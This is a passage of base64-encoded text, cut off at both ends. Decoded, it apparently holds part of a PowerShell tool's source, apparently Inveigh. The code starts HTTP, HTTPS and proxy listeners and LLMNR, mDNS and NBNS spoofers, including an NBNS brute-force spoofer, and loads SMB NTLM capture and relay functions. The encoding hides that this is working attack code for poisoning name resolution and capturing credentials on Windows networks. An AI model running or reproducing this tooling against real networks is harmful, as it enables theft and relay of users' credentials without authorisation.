VbMF18T3V0LUZpbGUgJGludmVpZ2guUE9TVF9yZXF1ZXN0X291dF9maWxlIC1BcHBlbmQKICAgICAgICAgICAgICAgICRpbnZlaWdoLlBPU1RfcmVxdWVzdF9maWxlX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgICAgICBpZighJGludmVpZ2guY29uc29sZV9vdXRwdXQgLWFuZCAkQ29uc29sZVF1ZXVlTGltaXQgLWdlIDApCiAgICAgICAgewoKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2guY29uc29sZV9xdWV1ZS5Db3VudCAtZ3QgJENvbnNvbGVRdWV1ZUxpbWl0IC1hbmQgISRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICB9CgogICAgJGludmVpZ2guY29udHJvbCA9ICRmYWxzZQp9CgojIEVuZCBTY3JpcHRCbG9ja3MKIyBCZWdpbiBTdGFydHVwIEZ1bmN0aW9ucwoKIyBIVFRQIExpc3RlbmVyIFN0YXJ0dXAgRnVuY3Rpb24gCmZ1bmN0aW9uIEhUVFBMaXN0ZW5lcigpCnsKICAgICRwcm94eV9saXN0ZW5lciA9ICRmYWxzZQogICAgJEhUVFBTX2xpc3RlbmVyID0gJGZhbHNlCiAgICAkSFRUUF9ydW5zcGFjZSA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkSFRUUF9ydW5zcGFjZS5PcGVuKCkKICAgICRIVFRQX3J1bnNwYWNlLlNlc3Npb25TdGF0ZVByb3h5LlNldFZhcmlhYmxlKCdpbnZlaWdoJywkaW52ZWlnaCkKICAgICRIVFRQX3Bvd2Vyc2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAkSFRUUF9wb3dlcnNoZWxsLlJ1bnNwYWNlID0gJEhUVFBfcnVuc3BhY2UKICAgICRIVFRQX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkSFRUUF9zY3JpcHRibG9jaykuQWRkQXJndW1lbnQoJENoYWxsZW5nZSkuQWRkQXJndW1lbnQoJEhUVFBBdXRoKS5BZGRBcmd1bWVudCgKICAgICAgICAkSFRUUEJhc2ljUmVhbG0pLkFkZEFyZ3VtZW50KCRIVFRQQ29udGVudFR5cGUpLkFkZEFyZ3VtZW50KCRIVFRQSVApLkFkZEFyZ3VtZW50KCRIVFRQUG9ydCkuQWRkQXJndW1lbnQoCiAgICAgICAgJEhUVFBEZWZhdWx0RVhFKS5BZGRBcmd1bWVudCgkSFRUUERlZmF1bHRGaWxlKS5BZGRBcmd1bWVudCgkSFRUUERpcikuQWRkQXJndW1lbnQoCiAgICAgICAgJEhUVFBSZXNldERlbGF5KS5BZGRBcmd1bWVudCgkSFRUUFJlc2V0RGVsYXlUaW1lb3V0KS5BZGRBcmd1bWVudCgkSFRUUFJlc3BvbnNlKS5BZGRBcmd1bWVudCgKICAgICAgICAkSFRUUFNfbGlzdGVuZXIpLkFkZEFyZ3VtZW50KCROQk5TQnJ1dGVGb3JjZVBhdXNlKS5BZGRBcmd1bWVudCgkUHJveHkpLkFkZEFyZ3VtZW50KAogICAgICAgICRQcm94eUlnbm9yZSkuQWRkQXJndW1lbnQoJHByb3h5X2xpc3RlbmVyKS5BZGRBcmd1bWVudCgkV1BBREF1dGgpLkFkZEFyZ3VtZW50KAogICAgICAgICRXUEFEQXV0aElnbm9yZSkuQWRkQXJndW1lbnQoJFdQQURSZXNwb25zZSkgPiAkbnVsbAogICAgJEhUVFBfcG93ZXJzaGVsbC5CZWdpbkludm9rZSgpID4gJG51bGwKfQoKU3RhcnQtU2xlZXAgLW0gNTAKCiMgSFRUUFMgTGlzdGVuZXIgU3RhcnR1cCBGdW5jdGlvbiAKZnVuY3Rpb24gSFRUUFNMaXN0ZW5lcigpCnsKICAgICRwcm94eV9saXN0ZW5lciA9ICRmYWxzZQogICAgJEhUVFBTX2xpc3RlbmVyID0gJHRydWUKICAgICRIVFRQU19ydW5zcGFjZSA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkSFRUUFNfcnVuc3BhY2UuT3BlbigpCiAgICAkSFRUUFNfcnVuc3BhY2UuU2Vzc2lvblN0YXRlUHJveHkuU2V0VmFyaWFibGUoJ2ludmVpZ2gnLCRpbnZlaWdoKQogICAgJEhUVFBTX3Bvd2Vyc2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAkSFRUUFNfcG93ZXJzaGVsbC5SdW5zcGFjZSA9ICRIVFRQU19ydW5zcGFjZQogICAgJEhUVFBTX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkSFRUUFNfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJEhUVFBfc2NyaXB0YmxvY2spLkFkZEFyZ3VtZW50KCRDaGFsbGVuZ2UpLkFkZEFyZ3VtZW50KCRIVFRQQXV0aCkuQWRkQXJndW1lbnQoCiAgICAgICAgJEhUVFBCYXNpY1JlYWxtKS5BZGRBcmd1bWVudCgkSFRUUENvbnRlbnRUeXBlKS5BZGRBcmd1bWVudCgkSFRUUElQKS5BZGRBcmd1bWVudCgkSFRUUFNQb3J0KS5BZGRBcmd1bWVudCgKICAgICAgICAkSFRUUERlZmF1bHRFWEUpLkFkZEFyZ3VtZW50KCRIVFRQRGVmYXVsdEZpbGUpLkFkZEFyZ3VtZW50KCRIVFRQRGlyKS5BZGRBcmd1bWVudCgKICAgICAgICAkSFRUUFJlc2V0RGVsYXkpLkFkZEFyZ3VtZW50KCRIVFRQUmVzZXREZWxheVRpbWVvdXQpLkFkZEFyZ3VtZW50KCRIVFRQUmVzcG9uc2UpLkFkZEFyZ3VtZW50KAogICAgICAgICRIVFRQU19saXN0ZW5lcikuQWRkQXJndW1lbnQoJE5CTlNCcnV0ZUZvcmNlUGF1c2UpLkFkZEFyZ3VtZW50KCRQcm94eSkuQWRkQXJndW1lbnQoCiAgICAgICAgJFByb3h5SWdub3JlKS5BZGRBcmd1bWVudCgkcHJveHlfbGlzdGVuZXIpLkFkZEFyZ3VtZW50KCRXUEFEQXV0aCkuQWRkQXJndW1lbnQoCiAgICAgICAgJFdQQURBdXRoSWdub3JlKS5BZGRBcmd1bWVudCgkV1BBRFJlc3BvbnNlKSA+ICRudWxsCiAgICAkSFRUUFNfcG93ZXJzaGVsbC5CZWdpbkludm9rZSgpID4gJG51bGwKfQoKU3RhcnQtU2xlZXAgLW0gNTAKCiMgUHJveHkgTGlzdGVuZXIgU3RhcnR1cCBGdW5jdGlvbiAKZnVuY3Rpb24gUHJveHlMaXN0ZW5lcigpCnsKICAgICRwcm94eV9saXN0ZW5lciA9ICR0cnVlCiAgICAkSFRUUFNfbGlzdGVuZXIgPSAkZmFsc2UKICAgICRwcm94eV9ydW5zcGFjZSA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkcHJveHlfcnVuc3BhY2UuT3BlbigpCiAgICAkcHJveHlfcnVuc3BhY2UuU2Vzc2lvblN0YXRlUHJveHkuU2V0VmFyaWFibGUoJ2ludmVpZ2gnLCRpbnZlaWdoKQogICAgJHByb3h5X3Bvd2Vyc2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAkcHJveHlfcG93ZXJzaGVsbC5SdW5zcGFjZSA9ICRwcm94eV9ydW5zcGFjZQogICAgJHByb3h5X3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkcHJveHlfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJEhUVFBfc2NyaXB0YmxvY2spLkFkZEFyZ3VtZW50KCRDaGFsbGVuZ2UpLkFkZEFyZ3VtZW50KCRIVFRQQXV0aCkuQWRkQXJndW1lbnQoCiAgICAgICAgJEhUVFBCYXNpY1JlYWxtKS5BZGRBcmd1bWVudCgkSFRUUENvbnRlbnRUeXBlKS5BZGRBcmd1bWVudCgkUHJveHlJUCkuQWRkQXJndW1lbnQoJFByb3h5UG9ydCkuQWRkQXJndW1lbnQoCiAgICAgICAgJEhUVFBEZWZhdWx0RVhFKS5BZGRBcmd1bWVudCgkSFRUUERlZmF1bHRGaWxlKS5BZGRBcmd1bWVudCgkSFRUUERpcikuQWRkQXJndW1lbnQoCiAgICAgICAgJEhUVFBSZXNldERlbGF5KS5BZGRBcmd1bWVudCgkSFRUUFJlc2V0RGVsYXlUaW1lb3V0KS5BZGRBcmd1bWVudCgkSFRUUFJlc3BvbnNlKS5BZGRBcmd1bWVudCgKICAgICAgICAkSFRUUFNfbGlzdGVuZXIpLkFkZEFyZ3VtZW50KCROQk5TQnJ1dGVGb3JjZVBhdXNlKS5BZGRBcmd1bWVudCgkUHJveHkpLkFkZEFyZ3VtZW50KAogICAgICAgICRQcm94eUlnbm9yZSkuQWRkQXJndW1lbnQoJHByb3h5X2xpc3RlbmVyKS5BZGRBcmd1bWVudCgkV1BBREF1dGgpLkFkZEFyZ3VtZW50KAogICAgICAgICRXUEFEQXV0aElnbm9yZSkuQWRkQXJndW1lbnQoJFdQQURSZXNwb25zZSkgPiAkbnVsbAogICAgJHByb3h5X3Bvd2Vyc2hlbGwuQmVnaW5JbnZva2UoKSA+ICRudWxsCn0KCiMgU25pZmZlci9TcG9vZmVyIFN0YXJ0dXAgRnVuY3Rpb24KZnVuY3Rpb24gU25pZmZlclNwb29mZXIoKQp7CiAgICAkc25pZmZlcl9ydW5zcGFjZSA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkc25pZmZlcl9ydW5zcGFjZS5PcGVuKCkKICAgICRzbmlmZmVyX3J1bnNwYWNlLlNlc3Npb25TdGF0ZVByb3h5LlNldFZhcmlhYmxlKCdpbnZlaWdoJywkaW52ZWlnaCkKICAgICRzbmlmZmVyX3Bvd2Vyc2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAkc25pZmZlcl9wb3dlcnNoZWxsLlJ1bnNwYWNlID0gJHNuaWZmZXJfcnVuc3BhY2UKICAgICRzbmlmZmVyX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkc25pZmZlcl9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkU01CX05UTE1fZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkc25pZmZlcl9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkc25pZmZlcl9zY3JpcHRibG9jaykuQWRkQXJndW1lbnQoJElQKS5BZGRBcmd1bWVudCgkTExNTlIpLkFkZEFyZ3VtZW50KAogICAgICAgICRMTE1OUl9yZXNwb25zZV9tZXNzYWdlKS5BZGRBcmd1bWVudCgkTExNTlJUVEwpLkFkZEFyZ3VtZW50KCRtRE5TKS5BZGRBcmd1bWVudCgKICAgICAgICAkbUROU19yZXNwb25zZV9tZXNzYWdlKS5BZGRBcmd1bWVudCgkbUROU1R5cGVzKS5BZGRBcmd1bWVudCgkbUROU1RUTCkuQWRkQXJndW1lbnQoCiAgICAgICAgJE5CTlMpLkFkZEFyZ3VtZW50KCROQk5TX3Jlc3BvbnNlX21lc3NhZ2UpLkFkZEFyZ3VtZW50KCROQk5TVHlwZXMpLkFkZEFyZ3VtZW50KCROQk5TVFRMKS5BZGRBcmd1bWVudCgKICAgICAgICAkU01CKS5BZGRBcmd1bWVudCgkU3Bvb2Zlckhvc3RzSWdub3JlKS5BZGRBcmd1bWVudCgkU3Bvb2Zlckhvc3RzUmVwbHkpLkFkZEFyZ3VtZW50KAogICAgICAgICRTcG9vZmVySVApLkFkZEFyZ3VtZW50KCRTcG9vZmVySVBzSWdub3JlKS5BZGRBcmd1bWVudCgkU3Bvb2ZlcklQc1JlcGx5KS5BZGRBcmd1bWVudCgKICAgICAgICAkU3Bvb2ZlckxlYXJuaW5nKS5BZGRBcmd1bWVudCgkU3Bvb2ZlckxlYXJuaW5nRGVsYXkpLkFkZEFyZ3VtZW50KCRTcG9vZmVyTGVhcm5pbmdJbnRlcnZhbCkgPiAkbnVsbAogICAgJHNuaWZmZXJfcG93ZXJzaGVsbC5CZWdpbkludm9rZSgpID4gJG51bGwKfQoKIyBVbnByaXZpbGVnZWQgTExNTlIgU3Bvb2ZlciBTdGFydHVwIEZ1bmN0aW9uCmZ1bmN0aW9uIExMTU5SU3Bvb2ZlcigpCnsKICAgICRMTE1OUl9zcG9vZmVyX3J1bnNwYWNlID0gW1J1bnNwYWNlRmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlKCkKICAgICRMTE1OUl9zcG9vZmVyX3J1bnNwYWNlLk9wZW4oKQogICAgJExMTU5SX3Nwb29mZXJfcnVuc3BhY2UuU2Vzc2lvblN0YXRlUHJveHkuU2V0VmFyaWFibGUoJ2ludmVpZ2gnLCRpbnZlaWdoKQogICAgJExMTU5SX3Nwb29mZXJfcG93ZXJzaGVsbCA9IFtQb3dlclNoZWxsXTo6Q3JlYXRlKCkKICAgICRMTE1OUl9zcG9vZmVyX3Bvd2Vyc2hlbGwuUnVuc3BhY2UgPSAkTExNTlJfc3Bvb2Zlcl9ydW5zcGFjZQogICAgJExMTU5SX3Nwb29mZXJfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJHNoYXJlZF9iYXNpY19mdW5jdGlvbnNfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRMTE1OUl9zcG9vZmVyX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRMTE1OUl9zcG9vZmVyX3NjcmlwdGJsb2NrKS5BZGRBcmd1bWVudCgkSW5zcGVjdCkuQWRkQXJndW1lbnQoCiAgICAgICAgJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UpLkFkZEFyZ3VtZW50KCRTcG9vZmVySVApLkFkZEFyZ3VtZW50KCRTcG9vZmVySG9zdHNSZXBseSkuQWRkQXJndW1lbnQoCiAgICAgICAgJFNwb29mZXJIb3N0c0lnbm9yZSkuQWRkQXJndW1lbnQoJFNwb29mZXJJUHNSZXBseSkuQWRkQXJndW1lbnQoJFNwb29mZXJJUHNJZ25vcmUpLkFkZEFyZ3VtZW50KAogICAgICAgICRMTE1OUlRUTCkgPiAkbnVsbAogICAgJExMTU5SX3Nwb29mZXJfcG93ZXJzaGVsbC5CZWdpbkludm9rZSgpID4gJG51bGwKfQoKIyBVbnByaXZpbGVnZWQgbUROUyBTcG9vZmVyIFN0YXJ0dXAgRnVuY3Rpb24KZnVuY3Rpb24gbUROU1Nwb29mZXIoKQp7CiAgICAkbUROU19zcG9vZmVyX3J1bnNwYWNlID0gW1J1bnNwYWNlRmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlKCkKICAgICRtRE5TX3Nwb29mZXJfcnVuc3BhY2UuT3BlbigpCiAgICAkbUROU19zcG9vZmVyX3J1bnNwYWNlLlNlc3Npb25TdGF0ZVByb3h5LlNldFZhcmlhYmxlKCdpbnZlaWdoJywkaW52ZWlnaCkKICAgICRtRE5TX3Nwb29mZXJfcG93ZXJzaGVsbCA9IFtQb3dlclNoZWxsXTo6Q3JlYXRlKCkKICAgICRtRE5TX3Nwb29mZXJfcG93ZXJzaGVsbC5SdW5zcGFjZSA9ICRtRE5TX3Nwb29mZXJfcnVuc3BhY2UKICAgICRtRE5TX3Nwb29mZXJfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJHNoYXJlZF9iYXNpY19mdW5jdGlvbnNfc2NyaXB0YmxvY2spID4gJG51bGwKICAgICRtRE5TX3Nwb29mZXJfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJG1ETlNfc3Bvb2Zlcl9zY3JpcHRibG9jaykuQWRkQXJndW1lbnQoJEluc3BlY3QpLkFkZEFyZ3VtZW50KAogICAgICAgICRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UpLkFkZEFyZ3VtZW50KCRtRE5TVFRMKS5BZGRBcmd1bWVudCgkbUROU1R5cGVzKS5BZGRBcmd1bWVudCgkU3Bvb2ZlcklQKS5BZGRBcmd1bWVudCgKICAgICAgICAkU3Bvb2Zlckhvc3RzUmVwbHkpLkFkZEFyZ3VtZW50KCRTcG9vZmVySG9zdHNJZ25vcmUpLkFkZEFyZ3VtZW50KCRTcG9vZmVySVBzUmVwbHkpLkFkZEFyZ3VtZW50KAogICAgICAgICRTcG9vZmVySVBzSWdub3JlKSA+ICRudWxsCiAgICAkbUROU19zcG9vZmVyX3Bvd2Vyc2hlbGwuQmVnaW5JbnZva2UoKSA+ICRudWxsCn0KCiMgVW5wcml2aWxlZ2VkIE5CTlMgU3Bvb2ZlciBTdGFydHVwIEZ1bmN0aW9uCmZ1bmN0aW9uIE5CTlNTcG9vZmVyKCkKewogICAgJE5CTlNfc3Bvb2Zlcl9ydW5zcGFjZSA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkTkJOU19zcG9vZmVyX3J1bnNwYWNlLk9wZW4oKQogICAgJE5CTlNfc3Bvb2Zlcl9ydW5zcGFjZS5TZXNzaW9uU3RhdGVQcm94eS5TZXRWYXJpYWJsZSgnaW52ZWlnaCcsJGludmVpZ2gpCiAgICAkTkJOU19zcG9vZmVyX3Bvd2Vyc2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAkTkJOU19zcG9vZmVyX3Bvd2Vyc2hlbGwuUnVuc3BhY2UgPSAkTkJOU19zcG9vZmVyX3J1bnNwYWNlCiAgICAkTkJOU19zcG9vZmVyX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkTkJOU19zcG9vZmVyX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCROQk5TX3Nwb29mZXJfc2NyaXB0YmxvY2spLkFkZEFyZ3VtZW50KCRJbnNwZWN0KS5BZGRBcmd1bWVudCgKICAgICAgICAkTkJOU19yZXNwb25zZV9tZXNzYWdlKS5BZGRBcmd1bWVudCgkU3Bvb2ZlcklQKS5BZGRBcmd1bWVudCgkTkJOU1R5cGVzKS5BZGRBcmd1bWVudCgKICAgICAgICAkU3Bvb2Zlckhvc3RzUmVwbHkpLkFkZEFyZ3VtZW50KCRTcG9vZmVySG9zdHNJZ25vcmUpLkFkZEFyZ3VtZW50KCRTcG9vZmVySVBzUmVwbHkpLkFkZEFyZ3VtZW50KAogICAgICAgICRTcG9vZmVySVBzSWdub3JlKS5BZGRBcmd1bWVudCgkTkJOU1RUTCkgPiAkbnVsbAogICAgJE5CTlNfc3Bvb2Zlcl9wb3dlcnNoZWxsLkJlZ2luSW52b2tlKCkgPiAkbnVsbAp9CgojIE5CTlMgQnJ1dGUgRm9yY2UgU3Bvb2ZlciBTdGFydHVwIEZ1bmN0aW9uCmZ1bmN0aW9uIE5CTlNCcnV0ZUZvcmNlU3Bvb2ZlcigpCnsKICAgICROQk5TX2JydXRlZm9yY2Vfc3Bvb2Zlcl9ydW5zcGFjZSA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkTkJOU19icnV0ZWZvcmNlX3Nwb29mZXJfcnVuc3BhY2UuT3BlbigpCiAgICAkTkJOU19icnV0ZWZvcmNlX3Nwb29mZXJfcnVuc3BhY2UuU2Vzc2lvblN0YXRlUHJveHkuU2V0VmFyaWFibGUoJ2ludmVpZ2gnLCRpbnZlaWdoKQogICAgJE5CTlNfYnJ1dGVmb3JjZV9zcG9vZmVyX3Bvd2Vyc2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAkTkJOU19icnV0ZWZvcmNlX3Nwb29mZXJfcG93ZXJzaGVsbC5SdW5zcGFjZSA9ICROQk5TX2JydXRlZm9yY2Vfc3Bvb2Zlcl9ydW5zcGFjZQogICAgJE5CTlNfYnJ1dGVmb3JjZV9zcG9vZmVyX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkTkJOU19icnV0ZWZvcmNlX3Nwb29mZXJfcG93ZXJzaGVsbC5BZGRTY3JpcHQoJE5CTlNfYnJ1dGVmb3JjZV9zcG9vZmVyX3NjcmlwdGJsb2NrKS5BZGRBcmd1bWVudCgKICAgICAgICAkU3Bvb2ZlcklQKS5BZGRBcmd1bWVudCgkTkJOU0JydXRlRm9yY2VIb3N0KS5BZGRBcmd1bWVudCgkTkJOU0JydXRlRm9yY2VUYXJnZXQpLkFkZEFyZ3VtZW50KAogICAgICAgICROQk5TQnJ1dGVGb3JjZVBhdXNlKS5BZGRBcmd1bWVudCgkTkJOU1RUTCkgPiAkbnVsbAogICAgJE5CTlNfYnJ1dGVmb3JjZV9zcG9vZmVyX3Bvd2Vyc2hlbGwuQmVnaW5JbnZva2UoKSA+ICRudWxsCn0KCiMgQ29udHJvbCBMb29wIFN0YXJ0dXAgRnVuY3Rpb24KZnVuY3Rpb24gQ29udHJvbExvb3AoKQp7CiAgICAkY29udHJvbF9ydW5zcGFjZSA9IFtSdW5zcGFjZUZhY3RvcnldOjpDcmVhdGVSdW5zcGFjZSgpCiAgICAkY29udHJvbF9ydW5zcGFjZS5PcGVuKCkKICAgICRjb250cm9sX3J1bnNwYWNlLlNlc3Npb25TdGF0ZVByb3h5LlNldFZhcmlhYmxlKCdpbnZlaWdoJywkaW52ZWlnaCkKICAgICRjb250cm9sX3Bvd2Vyc2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAkY29udHJvbF9wb3dlcnNoZWxsLlJ1bnNwYWNlID0gJGNvbnRyb2xfcnVuc3BhY2UKICAgICRjb250cm9sX3Bvd2Vyc2hlbGwuQWRkU2NyaXB0KCRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrKSA+ICRudWxsCiAgICAkY29udHJvbF9wb3dlcnNoZWxsLkFkZFNjcmlwdCgkY29udHJvbF9zY3JpcHRibG9jaykuQWRkQXJndW1lbnQoJENvbnNvbGVRdWV1ZUxpbWl0KS5BZGRBcmd1bWVudCgKICAgICAgICAkTkJOU0JydXRlRm9yY2VQYXVzZSkuQWRkQXJndW1lbnQoJFJ1bkNvdW50KS5BZGRBcmd1bWVudCgkUnVuVGltZSkgPiAkbnVsbAogICAgJGNvbnRyb2xfcG93ZXJzaGVsbC5CZWdpbkludm9rZSgpID4gJG51bGwKfQoKIyBFbmQgU3RhcnR1cCBGdW5jdGlvbnMKCiMgU3RhcnR1cCBFbmFibGVkIFNlcnZpY2VzCgojIEhUVFAgU2VydmVyIFN0YXJ0CmlmKCRIVFRQIC1lcSAnWScpCnsKICAgIEhUVFBMaXN0ZW5lcgp9CgojIEhUVFBTIFNlcnZlciBTdGFydAppZigkSFRUUFMgLWVxICdZJykKewogICAgSFRUUFNMaXN0ZW5lcgp9CgojIFByb3h5IFNlcnZlciBTdGFydAppZigkUHJveHkgLWVxICdZJykKewogICAgUHJveHlMaXN0ZW5lcgp9CgojIFNuaWZmZXIvU3Bvb2ZlciBTdGFydAppZigoJExMTU5SIC1lcSAnWScgLW9yICRtRE5TIC1lcSAnWScgLW9yICROQk5TIC1lcSAnWScgLW9yICRTTUIgLWVxICdZJyAtb3IgJEluc3BlY3QpIC1hbmQgJGVsZXZhdGVkX3ByaXZpbGVnZSkKeyAKICAgIFNuaWZmZXJTcG9vZmVyCn0KZWxzZWlmKCgkTExNTlIgLWVxICdZJyAtb3IgJG1ETlMgLWVxICdZJyAtb3IgJE5CTlMgLWVxICdZJyAtb3IgJFNNQiAtZXEgJ1knKSAtYW5kICEkZWxldmF0ZWRfcHJpdmlsZWdlKQp7CgogICAgaWYoJExMTU5SIC1lcSAnWScpCiAgICB7CiAgICAgICAgTExNTlJTcG9vZmVyCiAgICB9CgogICAgaWYoJG1ETlMgLWVxICdZJykKICAgIHsKICAgICAgICBtRE5TU3Bvb2ZlcgogICAgfQoKICAgIGlmKCROQk5TIC1lcSAnWScpCiAgICB7CiAgICAgICAgTkJOU1Nwb29mZXIKICAgIH0KCiAgICBpZigkTkJOU0JydXRlRm9yY2UgLWVxICdZJykKICAgIHsKICAgICAgICBOQk5TQnJ1dGVGb3JjZVNwb29mZXIKICAgIH0KCn0KCiMgTkJOU0JydXRlRm9yY2UgU3Bvb2ZlciBTdGFydAppZigkTkJOU0JydXRlRm9yY2UgLWVxICdZJykKewogICAgTkJOU0JydXRlRm9yY2VTcG9vZmVyCn0KCiMgQ29udHJvbCBMb29wIFN0YXJ0CmlmKCRDb25zb2xlUXVldWVMaW1pdCAtZ2UgMCAtb3IgJGludmVpZ2guZmlsZV9vdXRwdXQgLW9yICROQk5TQnJ1dGVGb3JjZVBhdXNlIC1vciAkUnVuQ291bnQgLW9yICRSdW5UaW1lKQp7CiAgICBDb250cm9sTG9vcAp9CgojIENvbnNvbGUgT3V0cHV0IExvb3AKdHJ5CnsKCiAgICBpZigkaW52ZWlnaC5jb25zb2xlX291dHB1dCkKICAgIHsKCiAgICAgICAgaWYoJENvbnNvbGVTdGF0dXMpCiAgICAgICAgeyAgICAKICAgICAgICAgICAgJGNvbnNvbGVfc3RhdHVzX3RpbWVvdXQgPSBOZXctVGltZVNwYW4gLU1pbnV0ZXMgJENvbnNvbGVTdGF0dXMKICAgICAgICAgICAgJGNvbnNvbGVfc3RhdHVzX3N0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgICAgIH0KCiAgICAgICAgOmNvbnNvbGVfbG9vcCB3aGlsZSgoJGludmVpZ2gucnVubmluZyAtYW5kICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0KSAtb3IgKCRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQ291bnQgLWd0IDAgLWFuZCAkaW52ZWlnaC5jb25zb2xlX291dHB1dCkpCiAgICAgICAgewogICAgCiAgICAgICAgICAgIHdoaWxlKCRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQ291bnQgLWd0IDApCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBzd2l0Y2ggLXdpbGRjYXJkICgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdKQogICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICB7JF8gLWxpa2UgIiogd3JpdHRlbiB0byAqIiAtb3IgJF8gLWxpa2UgIiogZm9yIHJlbGF5ICoiIC1vciAkXyAtbGlrZSAiKlNNQiByZWxheSAqIiAtb3IgJF8gLWxpa2UgIiogbG9jYWwgYWRtaW5pc3RyYXRvciAqIn0KICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCgkaW52ZWlnaC5jb25zb2xlX3F1ZXVlWzBdICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcoJGludmVpZ2guY29uc29sZV9xdWV1ZVswXSkKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgeyRfIC1saWtlICIqIHNwb29mZXIgaXMgZGlzYWJsZWQiIC1vciAkXyAtbGlrZSAiKiBsb2NhbCByZXF1ZXN0IiAtb3IgJF8gLWxpa2UgIiogaG9zdCBoZWFkZXIgKiIgLW9yICRfIC1saWtlICIqIHVzZXIgYWdlbnQgcmVjZWl2ZWQgKiJ9CiAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJENvbnNvbGVPdXRwdXQgLWVxICdZJykKICAgICAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJGludmVpZ2guY29uc29sZV9xdWV1ZVswXSArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgI